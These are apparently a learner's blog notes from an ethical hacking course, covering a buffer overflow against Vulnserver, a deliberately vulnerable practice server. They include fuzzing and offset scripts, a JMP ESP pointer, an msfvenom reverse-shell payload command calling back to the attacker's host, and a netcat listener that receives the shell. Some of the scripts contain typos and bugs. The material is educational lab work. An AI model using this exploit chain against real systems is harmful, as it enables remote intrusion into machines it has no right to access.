---
layout:     post
title:      TCM PEH Manual Buffer Overflow Notes
date:       2021-04-01
summary:    TheCyberMentor's Practical Ethical Hacking course manual buffer overflow notes
categories: certs
thumbnail: cogs
tags:
 - certs
---
<h2 class="code-line" data-line-start=0 data-line-end=1 ><a id="Finally_here_bois_0"></a>Babby's first bottle bof!!!</h2>
<h2 class="code-line" data-line-start=1 data-line-end=2 ><a id="Intro_to_Buffer_Overflows_1"></a>Intro to Buffer Overflows</h2>
<h3 class="code-line" data-line-start=2 data-line-end=3 ><a id="Required_Installations_2"></a>Required Installations</h3>
<p class="has-line-data" data-line-start="3" data-line-end="8">Windows 7, 8.1, or 10<br>
Within that, Vulnserver (<a href="https://github.com/stephenbradshaw/vulnserver">https://github.com/stephenbradshaw/vulnserver</a>)<br>
Download as a zip from github, exctract to C:<br>
Immunity Debugger (<a href="https://www.immunityinc.com/products/debugger/">https://www.immunityinc.com/products/debugger/</a>)<br>
Install to C:</p>
<h2 class="code-line" data-line-start=9 data-line-end=10 ><a id="BOF_Explained_9"></a>BOF Explained</h2>
<p class="has-line-data" data-line-start="10" data-line-end="20">Anatomy of Memory<br>
KERNEL—&gt;1111<br>
STACK{<br>
ESP (Ext Stack Ptr)<br>
Buffer Space<br>
EBP (Ext Base Ptr)<br>
EIP (Ext Instr Ptr)/Return Address}<br>
HEAP<br>
DATA<br>
TEXT—&gt;0000</p>
<p class="has-line-data" data-line-start="21" data-line-end="31">Ideally, the Buffer Space should be able to take a bunch of characters, but should STOP before EBP starts.<br>
Buffer Space[AA<br>
AAAAAAAAAAA<br>
AAAAAAAAAAA<br>
AAAAAAAAAAA<br>
EBP[AAAAAAAA]<br>
EIP[AAApayload]<br>
Get a payload into the EIP and you have a BOF<br>
Kind of.<br>
You still have to find vulnerable, non-protected modules within the binary to do a jump call to, then do some padding (nop sled), and where you then end up is where you execute reverse shell payload.</p>
<p class="has-line-data" data-line-start="32" data-line-end="33">Steps to conduct a BOF</p>
<ol>
<li class="has-line-data" data-line-start="33" data-line-end="34">Spiking</li>
<li class="has-line-data" data-line-start="34" data-line-end="35">Fuzzing</li>
<li class="has-line-data" data-line-start="35" data-line-end="36">Finding the Offset</li>
<li class="has-line-data" data-line-start="36" data-line-end="37">Overwriting the EIP</li>
<li class="has-line-data" data-line-start="37" data-line-end="38">Finding bad chars</li>
<li class="has-line-data" data-line-start="38" data-line-end="39">Finding the right Module</li>
<li class="has-line-data" data-line-start="39" data-line-end="40">Generating Shellcode</li>
<li class="has-line-data" data-line-start="40" data-line-end="42">Root!</li>
</ol>
<h2 class="code-line" data-line-start=42 data-line-end=43 ><a id="BOF_Spiking_42"></a>BOF Spiking</h2>
<h3 class="code-line" data-line-start=43 data-line-end=44 ><a id="NOTE_The_following_process_must_be_performed_after_each_run_at_the_vulnserver_in_order_to_reattach_immunity_and_debug_properly_43"></a>NOTE: The following process must be performed after each run at the vulnserver, in order to re-attach immunity and debug properly!!!</h3>
<h3 class="code-line" data-line-start=44 data-line-end=45 ><a id="Rclick_vunserver_run_as_Admin_44"></a>Rclick vunserver, run as Admin</h3>
<h3 class="code-line" data-line-start=45 data-line-end=46 ><a id="Run_Immunity_as_Admin_45"></a>Run Immunity as Admin</h3>
<h3 class="code-line" data-line-start=46 data-line-end=47 ><a id="In_Immunity_click_FileAttach_46"></a>In Immunity click File&gt;Attach</h3>
<h3 class="code-line" data-line-start=47 data-line-end=48 ><a id="Scroll_down_click_Vulnserver_47"></a>Scroll down, click Vulnserver</h3>
<h3 class="code-line" data-line-start=48 data-line-end=49 ><a id="Click_StartPlay_button_48"></a>Click Start/Play button</h3>
<p class="has-line-data" data-line-start="49" data-line-end="59">Move to Kali machine<br>
Vulnserver runs on tcp 9999<br>
nc -nv &lt;winIP&gt;:9999<br>
HELP<br>
The TRUN command is vulnerable, here.<br>
STATS is not vulnerable.<br>
Let’s look at STATS first, and compare.<br>
EXIT<br>
generic_send_tcp<br>
generic_send_tcp requires &lt;port&gt; &lt;spike_script&gt; &lt;SKIPVAR&gt; &lt;SKIPSTR&gt;</p>
<hr>
<p class="has-line-data" data-line-start="60" data-line-end="64">This is in the demo spike_strip, named stats.spk<br>
s_readline();<br>
s_string(“STATS”);<br>
s_string_variable(“0”);</p>
<hr>
<h2 class="code-line" data-line-start=65 data-line-end=67 ><a id="So_when_this_is_sent_it_will_send_a_ton_of_characters_then_even_more_chars_then_even_more_more_chars_to_see_where_things_break_65"></a>So when this is sent, it will send a ton of characters, then even more chars, then even more more chars, to see where things break.</h2>
<p class="has-line-data" data-line-start="67" data-line-end="69">generic_send_tcp 192.168.x.x 9999 stats.spk 0 0<br>
In Immunity, server is taking commands but nothing is happening during the spike.</p>
<hr>
<p class="has-line-data" data-line-start="70" data-line-end="74">So for the TRUN command, the spike_strip is:<br>
s_readline();<br>
s_string(“TRUN”);<br>
s_string_variable(“0”);</p>
<hr>
<p class="has-line-data" data-line-start="75" data-line-end="82">generic_send_tcp 192.168.x.x 9999 trun.spk 0 0<br>
In immunity, server is taking commands then almost immediatey crashes.<br>
ctrl+c the generic_send_tcp<br>
Looking in Immunity, TRUN sends AAAAAAAA to buffer, at EAX, then down in ESP there are a ton more ASCII AAAAAA’s<br>
<img src="https://i.imgur.com/GGLW9yu.png" alt="imageA"><br>
Below the ESP, the EBP is 41414141, which is AAAA<br>
Below the EBP, the EIP is 41414141, which is AAAA, therefore we can write right through to the EIP.</p>
<p class="has-line-data" data-line-start="83" data-line-end="84">So I guess now, it’s “how many characters does it take to get to the beginning of the EIP?”</p>
<h2 class="code-line" data-line-start=85 data-line-end=86 ><a id="Fuzzing_85"></a>Fuzzing</h2>
<p class="has-line-data" data-line-start="86" data-line-end="87">Fuzzing is similar to Spiking, but is different?  Seems like it’s just that Spiking is specifically one method and Fuzzing is multiple variables or methods.  But I’m not clear on that.</p>
<p class="has-line-data" data-line-start="88" data-line-end="106">Demo is a <a href="http://1.py">1.py</a><br>
{% highlight ruby %}<br>
#!/usr/bin/python  
import sys, socket  
from time import sleep  
buffer = A * 100  
while True:  
    try:  
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
        s.connect(('192.168.x.x,9999))  
        s.send(('TRUN /.:/' + buffer)) // Added the .: just because we saw that it runs when we send TRUN before the chars begin.  
        s.close()  
        sleep(1)
        buffer = buffer + “A”*100 // If 100 wasn't enough, let's grow exponentially  
    except:  
        print “Fuzzing crashed at %s bytes” % str(len(buffer)) // (len(var)) will run funct Length on variable Buffer and should tell us the position that broke things.    
        sys.exit()  
{% endhighlight %}</p>
<hr>
<p class="has-line-data" data-line-start="107" data-line-end="116">chmod +x <a href="http://1.py">1.py</a><br>
./1.py<br>
In immunity, vulnserver starts receiving connections then crashes<br>
ctrl+c to stop <a href="http://1.py">1.py</a><br>
Output: Fuzzing crashed at 2700 bytes<br>
Looking in Immunit, doesn’t look ike EIP was overwritten<br>
<img src="https://i.imgur.com/qYtOt6t.png" alt="imageB"><br>
He says, round it up to about 3000 bytes<br>
So about 3000 will crash out of the buffer, I guess more will get us to EIP.</p>
<h2 class="code-line" data-line-start=117 data-line-end=118 ><a id="Finding_the_Offset_117"></a>Finding the Offset</h2>
<p class="has-line-data" data-line-start="118" data-line-end="123">Looking for the EIP<br>
Tool in MSF is pattern_create<br>
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 // -l is Length<br>
Hit enter<br>
It generates a crazy cyclical code that will have to be sent into server</p>
<hr>
<p class="has-line-data" data-line-start="124" data-line-end="138">New demo script, named <a href="http://2.py">2.py</a>:<br>
{% highlight ruby %}<br>
#!/usr/bin/python  
import sys, socket  
offset = "<paste code here>  
try:  
    s=socket(socket.AF_NET,socket.SOCK_STREAM)  
    s.connect(('192.168.x.x',9999))  
    s.send(('TRUN /.:/' + offset)) // send the value  
    s.close()  
except:  
    print “Error connecting to server”  
    sys.exit() // then close the connection, we'll use tool to find offset based on char pattern  
{% endhighlight %}</p>
<hr>
<p class="has-line-data" data-line-start="139" data-line-end="151">chmod +x <a href="http://2.py">2.py</a><br>
./2.py<br>
In immunity, server starts accepting connections and immediately crashes.<br>
Looks like it is going right through EBP and into the EIP.<br>
<img src="https://i.imgur.com/WfDKLji.png" alt="imageC"><br>
What we’re looking for is the hex value in EIP (386F4337)<br>
Go back to terminal<br>
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337<br>
Hit enter<br>
If we did it right, that pattern will have an output of [*] Exact match at offset 2003<br>
Now we can test.  There are 2003 bytes before EIP, then bytes 2004, 2005, 2006, 2006 are the EIP.<br>
Interesting, that is a small chunk of code to fit a shell or new pointer in.</p>
<h2 class="code-line" data-line-start=153 data-line-end=154 ><a id="Overwriting_the_EIP_153"></a>Overwriting the EIP</h2>
<p class="has-line-data" data-line-start="154" data-line-end="168">Alter the demo script <a href="http://2.py">2.py</a>:<br>
{% highlight ruby %}<br>
#!/usr/bin/python  
import sys, socket  
shellcode = “A”*2003 + “B” * 4 // offset filler up to EIP, then 4 B's within EIP  
try:  
    s=socket(socket.AF_NET,socket.SOCK_STREAM)  
    s.connect(('192.168.x.x',9999))  
    s.send(('TRUN /.:/' + shellcode))  
    s.close()  
except:  
    print “Error connecting to server”  
    sys.exit()   
{% endhighlight %}</p>
<hr>
<p class="has-line-data" data-line-start="169" data-line-end="177">chmod +x <a href="http://2.py">2.py</a><br>
./2.py<br>
In immunity, server accepts and crashes<br>
Looking in Immunity, AAAA’s are send to buffer<br>
EBP gets filled with 41414141 (AAAA)<br>
EIP gets filled with 42424242 (BBBB), exactly 4 B’s.<br>
Our offset is perfect.<br>
So now we look for bad characters to see what we CANNOT send to EIP to prevent blindly crashing with our payload.</p>
<h2 class="code-line" data-line-start=179 data-line-end=180 ><a id="Finding_Bad_Chars_179"></a>Finding Bad Chars</h2>
<p class="has-line-data" data-line-start="180" data-line-end="185">We need to generate shellcode<br>
We need to find outt what characters are good for the shellcode<br>
We need to find out what characters are bad for the shellcode<br>
This stuff will be hex<br>
By default, null byte is a bad char</p>
<p class="has-line-data" data-line-start="186" data-line-end="214">Google badchars (<a href="https://www.ins1gn1a.com/identifying-bad-characters/#sending-a-bad-character-array">https://www.ins1gn1a.com/identifying-bad-characters/#sending-a-bad-character-array</a>)<br>
Copy/paste the badChars variable into previous <a href="http://2.py">2.py</a> and edit like so:<br>
{% highlight ruby %}<br>
#!/usr/bin/python  
import sys, socket  
badChars = (  
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"  
)  
shellcode = “A”*2003 + badChars // offset filler up to EIP, then badChars in EIP  
try:  
    s=socket(socket.AF_NET,socket.SOCK_STREAM)  
    s.connect(('192.168.x.x',9999))  
    s.send(('TRUN /.:/' + shellcode))  
    s.close()  
except:  
    print “Error connecting to server”  
    sys.exit()   
{% endhighlight %}<br>
Save it<br>
Run it with Immuity attached to vulnserver<br>
./2.py<br>
In immunity, r-click the EIP, click Follow in Dump<br>
Look at the hex dump<br>
<img src="https://i.imgur.com/EMJ7p2g.png" alt="imageD"><br>
The last thing sent in badChars is xff, ie. FF and FF is present in EIP dump<br>
We’re looking at what’s missing or out of place from the hexdump, like in this pic<br>
<img src="https://i.imgur.com/Py9XIYk.png" alt="imageE"><br>
The badChars is just all Hex listed from 01 to FF (00 is always bad, no point in confirming).  Which ever chars are missing (replaced with some other weird hex char) is a bad character.</p>
<p class="has-line-data" data-line-start="215" data-line-end="217">Write down the bad characters.<br>
They will ALL HAVE TO GO into shellcode that we generate later.</p>
<h2 class="code-line" data-line-start=218 data-line-end=219 ><a id="Finding_the_Right_Module_218"></a>Finding the Right Module</h2>
<p class="has-line-data" data-line-start="219" data-line-end="221">There’s a tool called <a href="http://Mona.py">Mona.py</a> that works with immunity (<a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/</a>)<br>
Follow the instructions in the above jump to install</p>
<p class="has-line-data" data-line-start="222" data-line-end="229">After installing, start vulnserver again, attach Immunity again<br>
In immunity, at the very bottom text bar, type<br>
!mona modules<br>
and hit enter<br>
<img src="https://i.imgur.com/e1nkRgD.png" alt="imageF"><br>
A new pane will pop up with a table of Module info.<br>
We’re looking for something that’s:</p>
<ol>
<li class="has-line-data" data-line-start="229" data-line-end="230">Attached to vulnserver and</li>
<li class="has-line-data" data-line-start="230" data-line-end="235">Is all Falses.<br>
False means not protected, True means protected.<br>
See pic<br>
<img src="https://i.imgur.com/F4ZIfU9.png" alt="imageG"></li>
</ol>
<p class="has-line-data" data-line-start="235" data-line-end="245">Now we need to figure out what op code JMP ESP is, so we can use it to point the BOF to a larger shell code space.<br>
In terminal,<br>
locate nasm_shell<br>
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb<br>
nasm &gt; JMP ESP<br>
Output:<br>
00000000    FFE4   jmp esp<br>
So the opcode equivalent to a jmp esp code is FFE4<br>
exit<br>
Go back to immunity</p>
<p class="has-line-data" data-line-start="246" data-line-end="253">in bottom, type<br>
!mona find -s “\xff\xe4”-m essfunc.dll<br>
\xff\xe4 = FFE4 (jmp esp)<br>
-s = search<br>
-m = module<br>
essfunc.dll = the unprotected module found from !mona modules<br>
In the results, you’ll see the first column in table is locations for FFE4 pointers (<a href="https://i.imgur.com/c1dEZn7.png">https://i.imgur.com/c1dEZn7.png</a>)</p>
<p class="has-line-data" data-line-start="254" data-line-end="270">Back in terminal,<br>
edit the <a href="http://2.py">2.py</a> script as:<br>
{% highlight ruby %}<br>
#!/usr/bin/python  
import sys, socket  
shellcode = “A”*2003 + “\xaf\x11\x50\x62” // ← this is the 625011af first pointer in first column from the !mona find results above (litte endian because binary is 32-bit x86)  
try:  
    s=socket(socket.AF_NET,socket.SOCK_STREAM)  
    s.connect(('192.168.x.x',9999))  
    s.send(('TRUN /.:/' + shellcode))  
    s.close()  
except:  
    print “Error connecting to server”  
    sys.exit()   
{% endhighlight %}<br>
Save and close.</p>
<p class="has-line-data" data-line-start="271" data-line-end="280">Back in immunity,<br>
click the Follow Expression arrow and enter the essfunc.dll pointer 625011af as in pic (<a href="https://i.imgur.com/FCwEnO3.png">https://i.imgur.com/FCwEnO3.png</a>)<br>
Immunity will jump to that position in the code, it should be a JMP ESP call.<br>
Press F2 to set break point at that position.<br>
Now when we run the program, IF <a href="http://2.py">2.py</a> jumps to that call, then the program will halt.<br>
So this is all a confirmation phase.<br>
Run vulnserver, run <a href="http://2.py">2.py</a><br>
In immunity, vulnserver did stop at 625011af.<br>
So we can write to EIP, then jump to this position from EIP.</p>
<p class="has-line-data" data-line-start="281" data-line-end="282">Now what?  Do we then write into that position, or what?  I don’t know, yet.</p>
<h2 class="code-line" data-line-start=283 data-line-end=284 ><a id="Generating_Shellcode__Gaining_Root_283"></a>Generating Shellcode &amp; Gaining Root</h2>
<p class="has-line-data" data-line-start="284" data-line-end="285">Let’s see where this process goes.</p>
<p class="has-line-data" data-line-start="286" data-line-end="311">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;our ip&gt; LPORT=4444 EXITFUNC=thread -f -c -a x86 -b “\x00&lt;and any other bad chars&gt;”<br>
Take note of payload size.  This one is 351 bytes.<br>
Copy the payload<br>
<img src="https://i.imgur.com/cLLfd4O.png" alt="imageH"><br>
Edit <a href="http://2.py">2.py</a> as:<br>
{% highlight ruby %}<br>
#!/usr/bin/python  
import sys, socket  
overflow = (  
"paste the actual payload hex here")  
shellcode = “A”*2003 + “\xaf\x11\x50\x62” + “\x90” + 32 + overflow
// “\x90” + 32 is a NOPslide, it's padding to get us past any other NOP calls before calling the payload.    
try:  
    s=socket(socket.AF_NET,socket.SOCK_STREAM)  
    s.connect(('192.168.x.x',9999))  
    s.send(('TRUN /.:/' + shellcode))  
    s.close()  
except:  
    print “Error connecting to server”  
    sys.exit()   
{% endhighlight %}<br>
Save and close.</p>
<p class="has-line-data" data-line-start="312" data-line-end="319">In terminal, open nc listener<br>
nc -lvnp 4444<br>
Run vulnserver as Admin again<br>
run <a href="http://2.py">2.py</a><br>
check netcat listener, has a shell<br>
whoami<br>
(admin, because it ran as Admin through vulnserver)</p>
<h1 class="code-line" data-line-start=319 data-line-end=320 ><a id="BOF_Achieved_319"></a>BOF Achieved</h1>
